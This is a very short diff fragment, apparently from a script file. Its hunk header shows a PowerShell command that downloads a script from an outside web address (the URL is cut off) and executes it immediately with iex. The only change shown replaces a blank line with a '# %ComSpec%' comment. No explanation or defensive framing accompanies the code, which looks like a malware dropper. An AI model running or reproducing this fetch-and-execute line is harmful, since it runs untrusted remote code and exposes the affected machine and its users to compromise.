@@ -12,4 +12,4 @@ powershell "iex(New-Object Net.WebClient).DownloadString('http://www.geographyco
 
 
 
- 
+ # %ComSpec%
